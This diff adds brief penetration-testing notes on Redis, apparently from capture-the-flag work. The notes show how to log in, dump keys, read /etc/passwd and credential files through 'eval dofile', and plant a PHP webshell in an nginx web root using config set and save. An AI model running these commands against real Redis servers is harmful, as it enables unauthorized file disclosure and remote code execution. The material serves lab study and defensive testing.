@@ -1,1 +1,34 @@
+Redis
+Redis is an open source, in-memory data structure store, used as a database, cache and message broker.
+If redis is open and we have its credential we can login from cli
+
+    redis-cli -h $ip -a 'password'
+
+-NOAUTH command to check if authorization is required or not
+
+    keys * (this command list the dbcontents)
+
+    lrange db_keyname 1 100 (if type command doesnt display the contents )
+
+    Enumerating files
+    eval dofile("/etc/passwd") 0
+    eval "dofile('c:\\users\\path')" 0
+
+    dumping redid db file
+    eval dofile('/var/data/app/db.conf');return(db.password); 0
+
+Getting rce through redis
+we can get webshell through redis if we have write access to a directory whithin web root or accessible by some other means
+
+    nc -nv $ip port
+
+10.85.0.52:6379> config set dir /usr/share/nginx/html OK 10.85.0.52:6379> config set dbfilename redis.php OK 10.85.0.52:6379> set test "" # Our code goes here OK 10.85.0.52:6379> save OK
+
+Or the eval dofile allows us to read system sensitive files via redis
+
+redis-cli -h 10.10.188.12 -p 6379 eval "dofile('C:\\Users\\enterprise-security\\Desktop\\user.txt')" 0
+
+we can also use netcat to connect to redis
+
+    nc $ip port
 
